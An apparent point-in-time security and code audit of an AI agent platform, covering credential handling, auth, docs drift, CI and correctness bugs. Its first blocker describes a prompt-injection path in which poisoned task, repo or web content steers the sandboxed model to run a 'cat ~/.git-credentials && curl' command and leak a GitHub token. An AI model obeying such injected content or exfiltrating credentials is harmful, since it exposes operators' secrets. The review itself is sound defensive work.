---
title: Deep Work code audit and enterprise-readiness review
status: review-artifact
kind: code-review
last_reviewed: 2026-07-27
reviewed_commit: d852bee1f036c20e7f019320cbf39f1fa27c0f47
owners: [review]
canonical: false
---

> **This is a point-in-time CODE REVIEW, not a canonical specification.** It records an
> external audit of the repository at commit `d852bee1f036c20e7f019320cbf39f1fa27c0f47` and does not define product,
> architecture, or security policy. Where it disagrees with the canonical docs, it is
> reporting a gap to be resolved — it is not itself authoritative. Do not cite it as a
> source of truth; supersede it with dated follow-up reviews rather than editing it in place.
>
> **Findings are as-of that commit and are deliberately not edited when later fixed** — this
> is a snapshot, not a live tracker. For what has since been remediated (e.g. C2 shell
> injection, H3 execution bounds, and the X0 doc reconciliation) and what remains open (e.g.
> C1 GitHub-App tokens), see the execution log in
> [`VISION_ALIGNMENT-2026-07-27.md`](VISION_ALIGNMENT-2026-07-27.md) and PR #110.

# Deep Work — Code Audit & Enterprise-Readiness Review

**Date:** 2026-07-27 · **Commit:** `d852bee1f036c20e7f019320cbf39f1fa27c0f47` (main) · Scope: full monorepo (apps/api, apps/web, packages/{domain,sdk,ui,agent}, tooling, CI, docs)

---

## Verdict

Deep Work is a **high-discipline pre-production prototype**, not yet enterprise-ready. The engineering *craft* is genuinely top-decile in places — the domain reducer, the SDK wire validation, the SQLite persistence layer, the HITL state machine, and the architecture checker are all better than what most funded teams ship. But a hosted, logged-in, real-LLM, sandbox-executing product was pushed onto that foundation in the last few days, and the newest seams (the agent sandbox + GitHub credential, the web app's streaming/auth layer, and the docs) were landed **without the rigor the rest of the repo holds itself to**.

The gap between the project's stated posture and its implemented reality is now the dominant risk. Two things are true simultaneously: the codebase's *organizing principle is honesty* ("runtime truth outranks plausible UI"), and **several canonical docs currently assert controls that do not exist.**

Three findings are release-blocking on their own. Fix those first; everything else is a prioritized cleanup.

---

## The three blockers

### 1. The sandbox GitHub credential is exfiltratable by the model (CRITICAL)
`packages/agent/src/deepwork_agent/runtime.py:191-210`

The scoped GitHub token is written **in cleartext** to `~/.git-credentials` *inside the same sandbox where the untrusted, model-driven agent has full shell, filesystem, and network access*. The agent's own system prompt treats task/repo/web content as untrusted — yet nothing stops a prompt-injected task, a poisoned repo file, or fetched web content from steering the model to `cat ~/.git-credentials && curl …` and emitting the token into the result. The commit claims the token is "never logged or surfaced in task content"; that's true of the API/event layer and misses the actual exposure — the sandbox itself.

Compounding it:
- **Shell injection** — the token is interpolated into a shell string with no `shlex.quote` (`runtime.py:201`). Not exploitable with today's GitHub token charset, but it's arbitrary command execution the moment a token format or secret-manager value contains punctuation.
- **No real lifecycle** — the docstring says "short-lived, repo-scoped," but the only source is a static `DEEPWORK_GITHUB_TOKEN` env var referenced nowhere else: no minting, no scoping, no expiry, no revocation. Every task gets the same token.
- **Zero tests** on this entire file (`runtime.py`), which is also where model/provider resolution and the sandbox factory live.

**Fix:** don't put a long-lived credential in an agent-readable location. Mint a per-task GitHub App installation token scoped to the one target repo with a minutes-long TTL, inject it via a credential helper/askpass that fetches from *outside* the sandbox (or do the push/PR from a trusted app process, with the agent only producing branch content), and revoke on task end. At minimum: `shlex.quote`, correct the docstring to the real trust model, and add tests asserting the token never reaches logs/repr.

### 2. Canonical security & program docs describe a product that isn't built (HIGH)
`docs/SECURITY.md:10-13`, `docs/PLANS.md`, `docs/RELIABILITY.md:18-19`, `docs/QUALITY_SCORE.md`, `README.md:109-111`

- `SECURITY.md`: *"multi-tenant from the first durable schema… every read, mutation, stream, object, job, audit event authorized with tenant and actor context."* **Reality:** the SQLite schema has **no tenant or actor columns** (verified); auth is one shared `DEEPWORK_ACCESS_KEY` minting a hardcoded `actor_id="operator"`; task routes do **no per-actor/per-tenant scoping** — any authenticated session can read, stop, approve, or re-plan *any* task.
- `RELIABILITY.md`: describes a PostgreSQL outbox and restartable workers. **Reality:** the worker is an explicit stub returning "unavailable"; no Postgres, no outbox, no jobs.
- `PLANS.md` still says *"No product runtime was implemented"* and points to a "repository-scaffold" as the next unit — while a hosted real-LLM product is live. No exec-plan exists for the real-agent/hosted/auth/persistence/sandbox work, despite the process mandating one for exactly this class of change.
- `README.md:109-111` says real-agent mode is in-memory with no durable recovery — superseded by the SQLite persistence added the same day.

For an enterprise buyer who reads `SECURITY.md` as the security contract, this is the most damaging gap in the repo: the code is *more honest than the docs*. Either implement the controls or correct the docs to state plainly that v1 is single-operator, single-shared-key, no tenant isolation. The docs must not assert controls that don't exist.

### 3. `main` fails its own quality gates and isn't branch-protected (HIGH)
`.github/workflows/checks.yml`, `tools/architecture/check.py`

The recent feature work was pushed **directly to `main`** (no PR suffixes, unlike all earlier history), so CI couldn't block it. On current `main`: the architecture checker exits non-zero (confirmed the non-zero exit directly), plus ruff lint/format failures reported by the tooling audit. The README's claim that "the same contract gates merges" is currently false. The 5 architecture violations map straight to the login/sandbox commits (transport importing `domain`/`ports`, raw `fetch` in React components, direct env reads in `runtime.py`).

**Fix:** enable branch protection requiring the `verify` job; fix the violations (auto-fixable ruff + either refactor or file documented graph.json exceptions); never push features to `main` again.

---

## Correctness bugs worth fixing (High)

| # | Where | Bug | Impact |
|---|---|---|---|
| B1 | `bootstrap/api.py:200-203` | Restart reconciliation runs **only** for the real-agent runner. In fixture+SQLite mode a persisted `waiting_approval` task survives restart with no runner behind it; approving it flips to `running` forever and SSE hangs. | Silent task zombies; the one place persistence isn't "honest." |
| B2 | `apps/web/src/lib/tasks-store.tsx:213-246` | Duplicate events are deduped in the log but still **re-applied** to the projection. A replayed `interrupt.requested` after its decision resurrects the approval card / flips status back. | Wrong UI state after any reconnect/replay. |
| B3 | `apps/web` streaming (`sse.ts`, store) | No gap detection, no rehydration on reconnect, no backoff/cap — relies entirely on native EventSource. Shows "Reconnecting…" forever on a dead (404/CLOSED) stream. | Silently stale/holey state; the unused SDK already solves this correctly. |
| B4 | `local_runner.py:293-296` | Decision idempotency breaks across restart in real-agent mode: a retried/duplicate decision (exactly when clients retry) becomes a 502 instead of an idempotent replay. | Client retries fail during the worst moments. |
| B5 | `sqlite.py:53` vs `domain/tasks.py:14-19` | 64 KiB serialized-event byte bound conflicts with the 18 K-*char* result bound; a legit multibyte (CJK/emoji) result fails `append_event` **after** the work succeeded → task marked FAILED. | Successful runs reported as failures. |
| B6 | `local/source.py:611-632`, `_planning.py:63-74` | Agent-side plan/answer length bounds don't match the API's hard caps; a verbose-but-valid plan/answer becomes a hard contract error → FAILED. | Good runs killed by a bound mismatch. |

---

## The biggest structural finding: the web app abandons the packages tier

`apps/web/package.json` has **zero `@deepwork/*` dependencies** (verified). The architecture's central promise — "apps/web composes domain + SDK; SDK services own requests" — is unimplemented. The app ships a complete **parallel, weaker** stack (`lib/task-types.ts`, `task-normalizers.ts`, `http-task-client.ts`, `sse.ts`, `tasks-store.tsx`) while the rigorously-validated, adversarially-tested `packages/domain` (event-sourced reducer with quarantine/reconcile) and `packages/sdk` (closed-key DTO validation, sequence-checked stream service) sit as **dead code**.

Drift already exists (status vocabularies differ; the web normalizers guess across `result|output|summary` where the SDK rejects unknown keys). Bugs B2 and B3 above are *exactly* what the SDK stream service already prevents. Every day of parallel evolution widens this. **Decide and act:** either wire `apps/web` onto the SDK + domain reducer (the intended design, retires B2/B3 and most of the web's correctness debt), or delete the packages and update `ARCHITECTURE.md`. Maintaining both guarantees divergence.

Related web issues: origin/auth config is likely broken in production — the task client defaults to an absolute `http://127.0.0.1:8000` base and never sends `credentials: "include"` / `withCredentials`, so the session cookie is absent on task calls unless an env var is set to the exact deployed origin (`http-task-client.ts:26,64`, `sse.ts:57`); a hardcoded Railway URL is baked into `next.config.ts:11`.

---

## Enterprise-readiness gaps (systemic, mostly operational)

**Observability — the single largest enterprise gap.** There is **no `logging` import in the entire API package**; access logs are disabled; no metrics, no correlation IDs, no error reporter. Combined with pervasive `raise … from None` cause-stripping, a production source outage or DB corruption is **undiagnosable** — the only artifact is a generic `safeReason` string. The content-sanitization primitives already exist (secrets are redacted from objectives, reviewer comments digested), so logging can be added safely. `/health` is liveness-only; there's no readiness probe over the DB or configured source, and `/demo/status` reports `unavailable` even when running with a real key + classic deployment.

**Auth hardening.** No rate limiting / lockout / brute-force protection on the single-shared-key login (`application/auth.py`), and `accessKey` accepts `min_length=1`. Sessions are in-memory only (every redeploy logs everyone out; expired sessions never swept). The crypto itself is done right (`hmac.compare_digest`, 256-bit tokens, correct HttpOnly/Secure/SameSite cookie flags) — but the token is also returned in the login response body, needlessly exposing it to browser JS. No CSRF token or Origin check as a second layer behind SameSite=Lax. No security response headers (HSTS/CSP/nosniff/frame-ancestors) on either app.

**No cost/loop controls on the agent.** No `max_tokens`, no `recursion_limit`, no per-run timeout, no retry on transient provider errors, and **a running task can't be cancelled in real-agent mode** (`tasks.py:358-376` — honestly documented, but it means a runaway task pushing with the #1 credential can only be stopped by killing the deployment). The bundled default system prompt (`system_prompt.txt`) is a **foreign harness prompt** (Codex-CLI-style) describing tools that don't exist here (`apply_patch`, `update_plan`, Windows PowerShell shell, MCP tools) and — critically — **omits the untrusted-content clause** that the fallback prompt has, making the shipped default *less* injection-resistant.

**Persistence scaling.** O(n²) event I/O: every append/snapshot/list re-reads and re-validates a task's entire event history to get a count (`sqlite.py:1311-1316`); `GET /tasks` scales with total stored events and has **no pagination**. No WAL, no multi-process safety (waiter wakeups are same-event-loop only — a second uvicorn worker silently breaks SSE/decisions), no retention/vacuum/backup. Unbounded in-process coordination state leaks (`_threads`, `_command_locks`, `_resume_acknowledgements`, trace cache, sessions).

**SSE.** No heartbeat/keepalive — a task parked at `waiting_approval` for hours will be severed by idle-timeout proxies (nginx/ALB/Cloudflare/Railway edge) and the client can't tell "quiet" from "dead." Add periodic `: keepalive` + a `retry:` hint.

**CI / supply chain.** No security scanning of any kind (no CodeQL, no Dependabot/Renovate, no `pip-audit`/`npm audit`, no secret scanning) despite the docs claiming a security/dependency posture dimension. Actions pinned to major tags, not SHAs (inconsistent with the repo's otherwise-strict pinning). No coverage reporting. The `apps/api/Dockerfile` is **not lockfile-reproducible** (`uv pip install .` resolves transitive deps fresh — the deployed API can drift from the tested set). `httpx` and `langchain-openai` are used but not declared as direct deps (OpenRouter support is effectively dead-on-arrival in deployment without `langchain-openai`). No versioning/changelog/tags/rollback story; deployment configs (Railway/Vercel) live out-of-repo.

**Architecture conformance (API).** Mostly clean and genuinely well-layered, but: the application layer type-switches on a concrete runner (`isinstance(LocalAgentServerRunner)` in 4 methods) instead of a `TaskRunner` port; a private cross-module import in the classic adapter; and the checker's forbidden-imports test enforces far less than `ARCHITECTURE.md` advertises (misses `importlib`-loaded SDK, no transport→adapters check).

---

## What's genuinely excellent (keep and build on)

- **Domain reducer** (`packages/domain`): canonical-fingerprint dedupe, strict sequence contiguity, identity-binding verification on every nested payload, quarantine-then-reconcile recovery — with 900+ lines of *adversarial* tests (forged bindings, replay conflicts, transition matrix). Top-decile.
- **SDK wire validation**: closed-key records, branded/bounded types, receipt correlation, typed error taxonomy with recovery hints.
- **SQLite persistence**: `BEGIN IMMEDIATE` + rollback (atomic, crash-safe per mutation), schema stamping + full-shape validation, rollback-on-failure migrations, `quick_check` on init, cancellation-shielded writes, fails closed (never falls back to memory).
- **HITL correctness**: one decision per interrupt, idempotent replay with conflict detection at both repositories, side-effect-free approve node (safe resume re-execution), comment digests instead of raw storage, resume acknowledged only after the source accepts.
- **Honesty as architecture**: no fabricated "cancelled"/"completed" states, honest restart recovery (orphans → failed with a truthful reason, not fake-running), trust labels on model output, `reject` returns a terminal message with no model call.
- **Input & injection hygiene**: `extra="forbid"` frozen Pydantic models, control-char rejection, strict path regexes, fully parameterized SQL, sanitized error surface (no stack traces, docs disabled), SSRF-conscious endpoint validation, no XSS sinks, no committed secrets.
- **The architecture checker** (`tools/architecture/check.py`, 1,177 lines): AST import extraction, layer/zone edges, browser/server boundary, secret-shape scanning, generated-view drift, with negative-fixture self-verification. One of the most thorough homegrown enforcers around — the problem is that it was *bypassed*, not that it's weak.
- **Test culture**: 276 API + 74 agent tests that attack races, corruption, and restarts rather than happy paths; strict mypy + network-denied tests; deterministic drift-checked OpenAPI; an executable axe-core WCAG 2.2 AA e2e audit.

---

## Prioritized recommendations

**P0 — before any wider exposure**
1. Re-architect the sandbox GitHub credential (per-task, minted, scoped, TTL'd, revoked; fetched outside the sandbox; `shlex.quote`; tests). *(Blocker #1)*
2. Reconcile docs with reality — mark `SECURITY.md`/`RELIABILITY.md` multi-tenant & outbox claims as target-not-implemented (or implement), update `PLANS.md`/`QUALITY_SCORE.md`/README, create the mandated exec-plans. *(Blocker #2)*
3. Fix `main` and enable branch protection requiring `verify`. *(Blocker #3)*
4. Add rate-limiting/lockout + minimum key entropy on login; stop returning the token in the response body.
5. Add agent cost/loop controls: `recursion_limit`, per-run timeout, `max_tokens`, bounded retry; implement real-agent cancellation (`runs.cancel`); replace the foreign system prompt with one written for this runtime that keeps the untrusted-content clause.

**P1 — production hardening**
6. Add structured logging (reuse existing sanitizers) + correlation IDs + a real error sink; stop `from None` cause-stripping before a sink exists; add a readiness probe; make `/demo/status` honest.
7. Fix the fixture+SQLite restart zombie (B1) and duplicate-decision-after-restart 502 (B4).
8. Decide the packages-vs-app-stack question and execute it — ideally wire `apps/web` onto the SDK stream service (retires B2/B3); fix the origin/credentials config so the session cookie actually reaches the API.
9. SSE keepalive + `retry:`; fix the byte/char bound mismatch (B5) and agent/API plan-length mismatch (B6).
10. Security scanning in CI (CodeQL + Dependabot/Renovate + `pip-audit`/`npm audit` + secret scanning); pin actions to SHAs; make the Dockerfile lockfile-reproducible; declare `httpx` and `langchain-openai`.

**P2 — scale & polish**
11. Replace O(n²) event scans with `MAX(event_id)`/`COUNT`; paginate `GET /tasks`; add WAL + a multi-process story (or enforce single-process); retention/vacuum/backup.
12. Move sessions to the durable store + sweep expired; bound/prune in-process coordination maps and event logs.
13. Introduce a `TaskRunner` port to kill the `isinstance` switches; wire the tools' own test suites into CI; add security response headers + CSRF second layer; add versioning/changelog/rollback.
14. Add tests for the untested seams: `runtime.py` (model resolution, sandbox factory, credential setup) and the web login/middleware/proxy path.

---

*Method: five parallel deep-read audits (security, API backend, frontend/TS, agent runtime, tests/CI+docs), each citing file:line evidence; the load-bearing cross-cutting findings were re-verified directly against the source at commit `d852bee1f036c20e7f019320cbf39f1fa27c0f47`.*
